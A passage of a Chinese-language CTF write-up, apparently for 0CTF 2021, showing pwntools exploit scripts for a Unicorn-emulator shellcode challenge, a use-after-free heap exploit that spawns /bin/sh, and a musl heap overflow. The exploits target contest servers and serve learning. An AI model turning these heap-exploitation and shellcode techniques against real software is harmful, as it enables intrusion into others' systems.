ADMIN = <span class="hljs-string">b&#x27;\xb9\x10\x00\x00\x00\x48\x8d\x15\x37\x00\x00\x00\x31\xc0\xbe\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x83\xec\x08\xe8\x5f\x00\x00\x00\x48\x8d\x05\x2b\x00\x00\x00\x48\xa3\x33\xe2\xaf\xec\xab\x0b\x00\x00\x48\x83\xc4\x08\x48\xbf\x00\xe0\xaf\xec\xab\x0b\x00\x00\xff\x67\x08\x49\x6d\x61\x67\x69\x6e\x61\x74\x69\x6f\x6e\x20\x69\x73\x20\x00\x6b\x33\x33\x6e\x6c\x61\x62\x65\x63\x68\x6f\x20\x27\x6d\x6f\x72\x65\x20\x69\x6d\x70\x6f\x72\x74\x61\x6e\x74\x20\x74\x68\x61\x6e\x20\x6b\x6e\x6f\x77\x6c\x65\x64\x67\x65\x2e\x27\x00\x48\x89\xf8\x48\x89\xf7\x48\x89\xd6\x48\x89\xca\x4d\x89\xc2\x4d\x89\xc8\x4c\x8b\x4c\x24\x08\x0f\x05\xc3&#x27;</span>.ljust(<span class="hljs-number">0x1000</span>, <span class="hljs-string">b&#x27;\xf4&#x27;</span>)
payload = ADMIN[:<span class="hljs-number">0x53</span>] + <span class="hljs-string">b&quot;k33nlab/readflag\x00&quot;</span>
patch_data(CODE+<span class="hljs-number">0x1000</span>, <span class="hljs-built_in">len</span>(payload), payload)

p.sendlineafter(<span class="hljs-string">&quot;?: \x00&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>)

p.interactive()
<span class="hljs-comment"># flag{Let&#x27;s_look_forward_to_unicorn2}</span></code></pre><h3 id="uc_goood"><a class="header-link" href="#uc_goood"></a>uc_goood</h3>
<p>基本流程和uc_masteeer一致，有一些关键地方做了修改：</p>
<pre class="hljs"><code>- uc.mem_write(STACK, p64(<span class="hljs-meta">CODE</span> + <span class="hljs-number">0x1000</span>) + p64(<span class="hljs-meta">CODE</span> + <span class="hljs-number">0x2000</span>) + p64(<span class="hljs-meta">CODE</span>))
+ uc.mem_write(<span class="hljs-meta">CODE</span> + <span class="hljs-number">0x800</span>, p64(<span class="hljs-meta">CODE</span> + <span class="hljs-number">0xff0</span>) + p64(<span class="hljs-meta">CODE</span> + <span class="hljs-number">0x2000</span>) + p64(<span class="hljs-meta">CODE</span>))</code></pre><p>CODE+0x800的位置是不可写的位置，所以之前uc_masteeer的方法失效了，不过我们要做的依然是既要触发0xdeadbeef066处的admin_hook，但是又不能让程序执行到0xdeadbef0028的位置</p>
<p>这里是用汇编错位执行的操作，注意到：</p>
<pre class="hljs"><code>uc.hook<span class="hljs-constructor">_add(UC_HOOK_CODE, <span class="hljs-params">admin_hook</span>, None, <span class="hljs-params">admin_offset</span>, <span class="hljs-params">admin_offset</span> + 1)</span></code></pre><p>所以0xdeadbeef066和0xdeadbeef067都可以触发admin_hook，我们可以输入下面的code，然后利用user test功能跳转过去，之后程序会跳到0xdeadbeef067</p>
<pre class="hljs"><code><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0xdeadbeef067</span><span class="hljs-comment">;</span>
<span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>], <span class="hljs-built_in">rbx</span><span class="hljs-comment">;</span>
<span class="hljs-keyword">jmp</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>]<span class="hljs-comment">;</span></code></pre><p>我这里在代码中加入了很笨的hook代码来观察RIP和RSP，来确保程序真的跳了过去</p>
<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ctf_hook</span>(<span class="hljs-params">uc, address, size, user_data</span>):</span>
    rsp = uc.reg_read(UC_X86_REG_RSP)
    rip = uc.reg_read(UC_X86_REG_RIP)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;rip ==&gt; 0x{:x}, rsp ==&gt; 0x{:x}&quot;</span>.<span class="hljs-built_in">format</span>(rip, rsp))

uc.hook_add(UC_HOOK_CODE, ctf_hook, <span class="hljs-literal">None</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)</code></pre><p>接下来来看看从0xdeadbeef066和0xdeadbeef067执行的区别：</p>
<p>0xdeadbeef066: </p>
<pre class="hljs"><code><span class="hljs-number">0xdeadbeef066</span>:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">ecx</span>, <span class="hljs-number">0x12</span>
<span class="hljs-number">0xdeadbeef06b</span>:    <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rdx</span>, [<span class="hljs-built_in">rip</span> + <span class="hljs-number">0x135</span>]
<span class="hljs-number">0xdeadbeef072</span>:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">esi</span>, <span class="hljs-number">1</span>
<span class="hljs-number">0xdeadbeef077</span>:    <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span></code></pre><p>0xdeadbeef067: </p>
<pre class="hljs"><code><span class="hljs-number">0xdeadbeef067</span>:    <span class="hljs-keyword">adc</span>    <span class="hljs-built_in">al</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span>]
<span class="hljs-number">0xdeadbeef069</span>:    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span>], <span class="hljs-built_in">al</span>
<span class="hljs-number">0xdeadbeef06b</span>:    <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rdx</span>, [<span class="hljs-built_in">rip</span> + <span class="hljs-number">0x135</span>]
<span class="hljs-number">0xdeadbeef072</span>:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">esi</span>, <span class="hljs-number">1</span></code></pre><p>看到指令发生了变化，让我们拥有了向一个<strong>相对可控的地址写入一个不可控字节的能力</strong></p>
<p>同时在admin_hook里加一个print，也可以看到的确执行了admin_hook，所以我们获得了admin_hook将ADMIN代码拷贝到CODE+0x1000之后，再次修改里面代码的资格！！</p>
<p>这里肯定是改CODE+0x1000之后的代码，因为CODE位置是不可写的</p>
<p>之后写了个代码来不断观察发生变化后的ADMIN代码，人工找一下什么时候我们可以有操作空间，只要不断修改下面的offset变量就可以了</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> capstone <span class="hljs-keyword">import</span> *

CODE = <span class="hljs-number">0xdeadbeef000</span>
STACK = <span class="hljs-number">0xbabecafe000</span>
admin_offset = CODE + <span class="hljs-number">0x6b</span> - <span class="hljs-number">5</span>

md = Cs(CS_ARCH_X86, CS_MODE_64)
md.detail = <span class="hljs-literal">True</span>

ADMIN = <span class="hljs-string">b&#x27;\xb9\x10\x00\x00\x00\x48\x8d\x15\x37\x00\x00\x00\x31\xc0\xbe\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x83\xec\x08\xe8\x5f\x00\x00\x00\x48\x8d\x05\x2b\x00\x00\x00\x48\xa3\x33\xe2\xaf\xec\xab\x0b\x00\x00\x48\x83\xc4\x08\x48\xbf\x00\xf8\xee\xdb\xea\x0d\x00\x00\xff\x67\x08\x49\x6d\x61\x67\x69\x6e\x61\x74\x69\x6f\x6e\x20\x69\x73\x20\x00\x6b\x33\x33\x6e\x6c\x61\x62\x65\x63\x68\x6f\x20\x27\x6d\x6f\x72\x65\x20\x69\x6d\x70\x6f\x72\x74\x61\x6e\x74\x20\x74\x68\x61\x6e\x20\x6b\x6e\x6f\x77\x6c\x65\x64\x67\x65\x2e\x27\x00\x48\x89\xf8\x48\x89\xf7\x48\x89\xd6\x48\x89\xca\x4d\x89\xc2\x4d\x89\xc8\x4c\x8b\x4c\x24\x08\x0f\x05\xc3&#x27;</span>.ljust(<span class="hljs-number">0x1000</span>, <span class="hljs-string">b&#x27;\xf4&#x27;</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;length of ADMIN =&gt; &quot;</span>, <span class="hljs-built_in">len</span>(ADMIN))

<span class="hljs-comment"># 0xdeadbeef067:    adc    al, byte ptr [rax]</span>
<span class="hljs-comment"># 0xdeadbeef069:    add    byte ptr [rax], al</span>
<span class="hljs-comment"># 0x2d pushfq</span>
offset = <span class="hljs-number">0</span>
rax = <span class="hljs-number">0xdeadbef0000</span> + offset

al = ((rax&amp;<span class="hljs-number">0xff</span>) + ADMIN[offset])&amp;<span class="hljs-number">0xff</span>
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(al), <span class="hljs-built_in">hex</span>(ADMIN[offset]))

rax2 = (<span class="hljs-number">0xdeadbef0000</span> &amp; <span class="hljs-number">0xfffffffff00</span>)+al
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(rax2))

<span class="hljs-keyword">if</span> rax2 &gt; (<span class="hljs-number">0xdeadbef0000</span>+<span class="hljs-number">0x32</span>):
    <span class="hljs-keyword">if</span> rax2 <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0xdeadbef0000</span>+<span class="hljs-number">0x80</span>, <span class="hljs-number">0xdeadbef0000</span>+<span class="hljs-number">0x9b</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-----nonono-----&quot;</span>)
        exit()
    
tmp = <span class="hljs-built_in">bytearray</span>(ADMIN)
tmp[rax2-<span class="hljs-number">0xdeadbef0000</span>] = (tmp[rax2-<span class="hljs-number">0xdeadbef0000</span>]+al)&amp;<span class="hljs-number">0xff</span>
ADMIN = <span class="hljs-built_in">bytes</span>(tmp)
<span class="hljs-comment">#print(al, ADMIN[offset])</span>


<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------- ADMIN CODE ----------&quot;</span>)
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> md.disasm(ADMIN[:<span class="hljs-number">0x45</span>], CODE+<span class="hljs-number">0x1000</span>):
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;0x%x:\t%s\t%s&quot;</span> %(i.address, i.mnemonic, i.op_str))

<span class="hljs-built_in">print</span>()
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> md.disasm(ADMIN[<span class="hljs-number">0x80</span>:<span class="hljs-number">0x9a</span>], CODE+<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x80</span>):
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;0x%x:\t%s\t%s&quot;</span> %(i.address, i.mnemonic, i.op_str))

<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(rax2))</code></pre><p>offset=0x9a的时候，我发现了可以操作的点，此时的ADMIN代码被修改为：</p>
<pre class="hljs"><code><span class="hljs-number">0xdeadbef0000</span>:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">ecx</span>, <span class="hljs-number">0x10</span>
<span class="hljs-number">0xdeadbef0005</span>:    <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rdx</span>, [<span class="hljs-built_in">rip</span> + <span class="hljs-number">0x37</span>]
<span class="hljs-number">0xdeadbef000c</span>:    <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span>
<span class="hljs-number">0xdeadbef000e</span>:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">esi</span>, <span class="hljs-number">1</span>
<span class="hljs-number">0xdeadbef0013</span>:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">edi</span>, <span class="hljs-number">1</span>
<span class="hljs-number">0xdeadbef0018</span>:    <span class="hljs-keyword">sub</span>    <span class="hljs-built_in">rsp</span>, <span class="hljs-number">8</span>
<span class="hljs-number">0xdeadbef001c</span>:    <span class="hljs-keyword">call</span>    <span class="hljs-number">0xdeadbef0080</span>
<span class="hljs-number">0xdeadbef0021</span>:    <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rip</span> + <span class="hljs-number">0x2b</span>]
<span class="hljs-number">0xdeadbef0028</span>:    movabs    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-number">0xbabecafe233</span>], <span class="hljs-built_in">rax</span>
<span class="hljs-number">0xdeadbef0032</span>:    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">rsp</span>, <span class="hljs-number">8</span>
<span class="hljs-number">0xdeadbef0036</span>:    movabs    <span class="hljs-built_in">rdi</span>, <span class="hljs-number">0xdeadbeef800</span>
<span class="hljs-number">0xdeadbef0040</span>:    <span class="hljs-keyword">jmp</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span> + <span class="hljs-number">8</span>]
<span class="hljs-number">0xdeadbef0043</span>:    <span class="hljs-keyword">insd</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span>], <span class="hljs-built_in">dx</span>

<span class="hljs-number">0xdeadbef0080</span>:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rdi</span>
<span class="hljs-number">0xdeadbef0083</span>:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsi</span>
<span class="hljs-number">0xdeadbef0086</span>:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rdx</span>
<span class="hljs-number">0xdeadbef0089</span>:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rcx</span>
<span class="hljs-number">0xdeadbef008c</span>:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">r8</span> + <span class="hljs-number">0x4d</span>], <span class="hljs-built_in">r10</span>
<span class="hljs-number">0xdeadbef0090</span>:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">ecx</span>
<span class="hljs-number">0xdeadbef0092</span>:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r9</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span> + <span class="hljs-number">8</span>]
<span class="hljs-number">0xdeadbef0097</span>:    <span class="hljs-keyword">syscall</span>    
<span class="hljs-number">0xdeadbef0099</span>:    <span class="hljs-keyword">ret</span>    </code></pre><p>注意此时的syscall里面的0xdeadbef008c位置有惊喜，是不是和0xdeadbef0028的功能一样，并且r8和r10程序中没有用，所以我们可以在user test的时候给r8和r10赋值，这样就可以让r10指向一处为&quot;k33nlab/readflag&quot;的位置再触发后门了！！</p>
<p>还有一点，不要忘记了，虽然r10和r8没有用，但是在正常的系统调用的时候，值发生了一点小变化：</p>
<pre class="hljs"><code><span class="hljs-number">0xdeadbef0080</span>:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rdi</span>
<span class="hljs-number">0xdeadbef0083</span>:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsi</span>
<span class="hljs-number">0xdeadbef0086</span>:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rdx</span>
<span class="hljs-number">0xdeadbef0089</span>:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rcx</span>
<span class="hljs-number">0xdeadbef008c</span>:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r10</span>, <span class="hljs-built_in">r8</span>
<span class="hljs-number">0xdeadbef008f</span>:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r9</span>
<span class="hljs-number">0xdeadbef0092</span>:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r9</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span> + <span class="hljs-number">8</span>]
<span class="hljs-number">0xdeadbef0097</span>:    <span class="hljs-keyword">syscall</span>    
<span class="hljs-number">0xdeadbef0099</span>:    <span class="hljs-keyword">ret</span></code></pre><p>所以实际上我们修改的是r8和r9</p>
<p>最后我们的利用思路总结如下：</p>
<ul class="list">
<li><p>在STACK中写下k33nlab/readflag的值</p>
</li>
<li><p>rax = 0xdeadbef0000+0x9a，来构造出0xdeadbef008c的代码</p>
</li>
<li><p>对r8，r9赋值，实际上就是对r10，r8赋值，使其满足mov  qword ptr [r8 + 0x4d], r10 ⇒ mov  qword ptr [0xbabecafe233], k33nlab/readflag&#39;s address</p>
</li>
<li><p>用user test跳转到0xdeadbeef067的位置，错位执行</p>
</li>
</ul>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

context.log_level = <span class="hljs-string">&quot;debug&quot;</span>
context.arch = <span class="hljs-string">&quot;amd64&quot;</span>
context.os = <span class="hljs-string">&quot;linux&quot;</span>

IP, PORT = <span class="hljs-string">&quot;111.186.59.29&quot;</span>, <span class="hljs-number">10088</span>

p = remote(IP, PORT)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">patch_data</span>(<span class="hljs-params">addr, size, data</span>):</span>
    p.sendlineafter(<span class="hljs-string">&quot;?: \x00&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>)
    p.sendafter(<span class="hljs-string">&quot;addr: \x00&quot;</span>, p64(addr))
    p.sendafter(<span class="hljs-string">&quot;size: \x00&quot;</span>, p64(size))
    p.sendafter(<span class="hljs-string">&quot;data: \x00&quot;</span>, data)

idx = <span class="hljs-number">0x9a</span>
my_code = asm(<span class="hljs-string">&#x27;&#x27;&#x27;
    mov rax, {};
    mov r9, 0xbabecafe1e6;
    mov r8, 0xbabecafe000;
    mov rbx, 0xdeadbeef067;
    mov qword ptr [rsp], rbx;
    jmp qword ptr [rsp];
&#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0xdeadbef0000</span>+idx))

p.send(my_code)


CODE = <span class="hljs-number">0xdeadbeef000</span>
STACK = <span class="hljs-number">0xbabecafe000</span>

payload = <span class="hljs-string">b&quot;k33nlab/readflag\x00&quot;</span>
patch_data(STACK, <span class="hljs-built_in">len</span>(payload), payload)


p.sendlineafter(<span class="hljs-string">&quot;?: \x00&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>)

p.interactive()
<span class="hljs-comment">#flag{Hope_you_enjoyed_the_series}</span></code></pre><h3 id="listbook"><a class="header-link" href="#listbook"></a>listbook</h3>
<p>漏洞点：</p>
<p>abs的漏洞，不过这次是abs8，当参数为0x80时可以uaf</p>
<p>利用思路：</p>
<ol class="list">
<li>题目吧chunk大小限制死了，tacahe有double free tcache2的检测只能在small bin上做文章</li>
<li>Tcache stashing unlink+：在smallbin中先放置5个chunk，free掉一个有两个指针控制的chunk ,用另一个指针uaf</li>
<li>2中的要求：后在不破坏fd的情况下将后放入smallbin的chunk的bk设置为目标地址-0x10。同时要令目标地址+8中的值是一个指向一处可写内存的指针。</li>
</ol>
<p>EXP:</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cmd</span>(<span class="hljs-params">c</span>):</span>
    p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>,<span class="hljs-built_in">str</span>(c))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">name=<span class="hljs-string">&#x27;\n&#x27;</span>,c=<span class="hljs-string">&#x27;A\n&#x27;</span></span>):</span>
    cmd(<span class="hljs-number">1</span>)
    p.sendafter(<span class="hljs-string">&quot;&gt;&quot;</span>,name)
    p.sendafter(<span class="hljs-string">&quot;&gt;&quot;</span>,c)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span>
    cmd(<span class="hljs-number">2</span>)
    p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-built_in">str</span>(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span>
    cmd(<span class="hljs-number">3</span>)
    p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-built_in">str</span>(idx))<span class="hljs-comment">#p=process(&quot;./pwn&quot;)</span>
p=remote(<span class="hljs-string">&quot;111.186.58.249&quot;</span>,<span class="hljs-number">20001</span>)<span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span>
context.terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;split&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]
add()
add(<span class="hljs-string">&quot;\x10&quot;</span>*<span class="hljs-number">0x10</span>)
show(<span class="hljs-number">0</span>)
p.readuntil(<span class="hljs-string">b&quot;\x10&quot;</span>*<span class="hljs-number">0x10</span>)
heap=u64(p.readuntil(<span class="hljs-string">&quot; &quot;</span>)[:-<span class="hljs-number">1</span>]+<span class="hljs-string">b&#x27;\0\0&#x27;</span>)-(<span class="hljs-number">0x2a0</span>)
log.warning(<span class="hljs-built_in">hex</span>(heap))
free(<span class="hljs-number">0</span>)
add()
add(<span class="hljs-string">&quot;\1\n&quot;</span>)
add(<span class="hljs-string">&quot;\2\n&quot;</span>)<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):
    add(<span class="hljs-string">&#x27;\6\n&#x27;</span>)
free(<span class="hljs-number">6</span>)
free(<span class="hljs-number">2</span>)
free(<span class="hljs-number">0</span>)
add(<span class="hljs-string">&#x27;\x80\n&#x27;</span>)
show(<span class="hljs-number">0</span>)
p.readuntil(<span class="hljs-string">&quot;=&gt; &quot;</span>)
base=u64(p.readline()[:-<span class="hljs-number">1</span>]+<span class="hljs-string">b&#x27;\0\0&#x27;</span>)-(<span class="hljs-number">0x7ffff7fbade0</span>-<span class="hljs-number">0x7ffff7dcf000</span>)
log.warning(<span class="hljs-built_in">hex</span>(base))<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):
    add(<span class="hljs-string">&#x27;\2\n&#x27;</span>)
add(<span class="hljs-string">&#x27;\7\n&#x27;</span>)<span class="hljs-comment">#*</span>
<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):
    add(<span class="hljs-string">&#x27;\6\n&#x27;</span>)<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):
     add(<span class="hljs-string">&#x27;\4\n&#x27;</span>)<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):
    add(<span class="hljs-string">&#x27;\3\n&#x27;</span>)
free(<span class="hljs-number">3</span>)
free(<span class="hljs-number">4</span>)
free(<span class="hljs-number">7</span>)<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):
    add(<span class="hljs-string">&#x27;\2\n&#x27;</span>)<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):
    add(<span class="hljs-string">&#x27;\4\n&#x27;</span>)
    free(<span class="hljs-number">4</span>)
add(<span class="hljs-string">&#x27;\4\n&#x27;</span>)
free(<span class="hljs-number">0</span>)
add(<span class="hljs-string">&#x27;\n&#x27;</span>,p64(<span class="hljs-number">0x000055555555afd0</span>-<span class="hljs-number">0x555555559000</span>+heap)+p64(<span class="hljs-number">0x5555555592b0</span>-<span class="hljs-number">0x10</span>-<span class="hljs-number">0x555555559000</span>+heap)+<span class="hljs-string">b&#x27;\n&#x27;</span>)
add(<span class="hljs-string">&#x27;\2\n&#x27;</span>)
add(<span class="hljs-string">&#x27;\0\n&#x27;</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x21</span>)+p64(base+<span class="hljs-number">0x1eeb20</span>)+<span class="hljs-string">b&#x27;\n&#x27;</span>)
add()
add(<span class="hljs-string">&#x27;\0\n&#x27;</span>,<span class="hljs-string">b&#x27;/bin/sh\0&#x27;</span>+p64(base+<span class="hljs-number">0x55410</span>)+<span class="hljs-string">b&#x27;\n&#x27;</span>)
free(<span class="hljs-number">0</span>)
p.interactive()</code></pre><h3 id="babyheap2021"><a class="header-link" href="#babyheap2021"></a>babyheap2021</h3>
<p>漏洞点：</p>
<p>edit处大小比较有问题可以用0x80000000来造成溢出。</p>
<p>利用思路：</p>
<ol class="list">
<li>先泄露因为musl堆和libc同一个base，可以通过overlap已经在使用的chunk来泄露</li>
<li>musl heap的unlink没有检查，可以链入任意地址来写</li>
<li>写stdin之后call exit就可以触发offset =0x48和0x50的函数指针</li>
<li>因为开了seccomp所以要orw，因为七号rbp是stdin，所以可以leave ret+rop</li>
<li>有个坑就是reomote时候 stdin有些地方会在readflag的时候变动，可以sub rsp来绕过</li>
</ol>
<p>Exp:</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span>
context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span>
context.terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;split&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cmd</span>(<span class="hljs-params">c</span>):</span>
    p.sendlineafter(<span class="hljs-string">&quot;: &quot;</span>,<span class="hljs-built_in">str</span>(c))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,c=<span class="hljs-string">&#x27;A&#x27;</span></span>):</span>
    cmd(<span class="hljs-number">1</span>)
    cmd(size)
    <span class="hljs-keyword">if</span>(size):
        p.sendlineafter(<span class="hljs-string">&quot;: &quot;</span>,c)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,size,c=<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">1</span></span>):</span>
    cmd(<span class="hljs-number">2</span>)
    cmd(idx)
    cmd(size)
    <span class="hljs-keyword">if</span>(size):
        p.sendlineafter(<span class="hljs-string">&quot;: &quot;</span>,c)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span>
    cmd(<span class="hljs-number">3</span>)
    cmd(idx)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span>
    cmd(<span class="hljs-number">4</span>)
    cmd(idx)<span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span>
p=remote(<span class="hljs-string">&quot;111.186.59.11&quot;</span>,<span class="hljs-number">11124</span>)
add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#0</span>
add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#1</span>
add(<span class="hljs-number">0x70</span>)<span class="hljs-comment">#2</span>
add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#3</span>
edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x80000000</span>,<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0x21</span>)+p64(<span class="hljs-number">0x81</span>)+<span class="hljs-string">b&#x27;\0&#x27;</span>*<span class="hljs-number">0x70</span>+p64(<span class="hljs-number">0x81</span>)+p64(<span class="hljs-number">0x21</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0x21</span>)[:-<span class="hljs-number">1</span>])
free(<span class="hljs-number">1</span>)
add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#1</span>
show(<span class="hljs-number">2</span>)p.readuntil(<span class="hljs-string">&quot;: &quot;</span>)
base=u64(p.read(<span class="hljs-number">8</span>))-(<span class="hljs-number">0x7ffff7ffba70</span>-<span class="hljs-number">0x7ffff7f4b000</span>)
log.warning(<span class="hljs-built_in">hex</span>(base))<span class="hljs-comment">#0x7ffff7ffba80</span>
add(<span class="hljs-number">0x50</span>)<span class="hljs-comment">#4</span>
puts=<span class="hljs-number">0x7ffff7fa9ed0</span>-<span class="hljs-number">0x7ffff7f4b000</span>+base

add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#5689</span>
add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#6</span>
add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#7</span>
add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#8</span>
add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#9</span>
free(<span class="hljs-number">6</span>)
free(<span class="hljs-number">8</span>)
victim=<span class="hljs-number">0x00007ffff7ffb170</span>-<span class="hljs-number">0x7ffff7f4b000</span>+base
